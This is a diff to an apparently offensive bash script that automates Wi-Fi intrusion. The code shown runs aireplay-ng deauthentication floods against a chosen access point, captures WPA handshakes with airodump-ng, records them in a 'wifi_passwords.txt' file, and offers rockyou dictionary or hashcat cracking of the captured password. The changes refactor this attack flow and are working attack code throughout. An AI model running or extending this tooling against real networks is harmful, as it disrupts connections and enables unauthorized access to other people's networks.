@@ -431,6 +431,7 @@ function devices_scanner() {
 		break
 	    fi
 	    echo -e "Scanning for devices..  \e[1;34m$i/20\e[0m"
+	    
 	    if sudo grep -q "WPA handshake: $bssid_address" "$targets_path/$bssid_name/airodump_output.txt"; then
 		echo -e "\033[1;32m->> Got the handshake!\033[0m\n"
 		sudo pkill aireplay-ng
@@ -439,13 +440,11 @@ function devices_scanner() {
 		echo --- >> $targets_path/wifi_passwords.txt
 		printf "We got handshake for (%s): %-40s at %s\n" "$bssid_address" "$bssid_name" "$(date +"%H:%M %d/%m/%y")" >> "$targets_path/wifi_passwords.txt"
 		cleanup
-		choose_password_attack
-                exit 1	    
+		choose_password_attack	    
 	    fi
-     
+	    
 	    sleep 3
 	done
- 
 	if [ -z "$target_devices" ]; then
 	    echo -e "\033[1m\nNo device were found.\033[0m"
 	    sudo pkill airodump-ng
@@ -462,15 +461,16 @@ function devices_scanner() {
 # ------------------------------
 function deauth_attack() {
 	    echo -e "\033[1;31m\033[1mStarting deauth attack ->>\033[0m"
-	    # trying 10 times (3 minutes) the deauth attack
-	    for ((i=1; i<=10; i++)); do        
+	    # trying 10 times (1 minutes) the deauth attack
+	    counter=10
+	    for ((i=1; i<=$counter; i++)); do        
 		target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$targets_path/$bssid_name/$bssid_name-01.kismet.netxml")		
 		#for target_device in $target_devices; do
 		#    gnome-terminal --geometry=1x1-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" "$wifi_adapter"mon
 		#done
 		gnome-terminal --geometry=78x4-10000-10000 -- sudo timeout 5s aireplay-ng --deauth 1000 -a "$bssid_address" "$wifi_adapter"mon
 		
-		echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         			
+		echo -e "Attempt \e[1;34m$i/$counter\e[0m to capture handshake of:"         			
 		# Print MAC addresses with vendor names
 		echo -e "$target_devices" | tr ' ' '\n' | while read -r mac; do
 		    if [[ -n "$mac" ]]; then
@@ -499,7 +499,7 @@ function deauth_attack() {
 		    fi    
 		done
 	    # after 10 unseccessfull attempts, quit the script:
-	    if [ "$i" == 10 ]; then
+	    if [ "$i" == "$counter" ]; then
 	    	echo -e "\033[1m\nNo handshake obtained within 2 minutes. Try again.\033[0m"
 	    	sudo pkill aireplay-ng
 		sudo pkill airodump-ng
@@ -728,18 +728,10 @@ function cleanup() {
 
 
 
-# ------------------------------
-# Main Process
-# ------------------------------
-function main_process() {
-	network_scanner
-	devices_scanner
-	deauth_attack
-	cleanup
-	
-	# Choose Attack
+function choose_password_attack() {
+
 	while true; do
-	    echo -e "\e[1m\nChoose an Attack:\e[0m"
+	    echo -e "\e[1m\nChoose how to crack the password:\e[0m"
 	    echo "1) Dictionary attack (rockyou)"
 	    echo "2) Hashcat crack"
 	    read -p "Enter your choice: " choice
@@ -756,7 +748,20 @@ function main_process() {
 		    echo "Invalid choice. Please select 1 or 2."
 		    ;;
 	    esac
-	done	
+	done
+}
+
+
+# ------------------------------
+# Main Process
+# ------------------------------
+function main_process() {
+	network_scanner
+	devices_scanner
+	deauth_attack
+	cleanup
+
+	choose_password_attack
 }
 
 
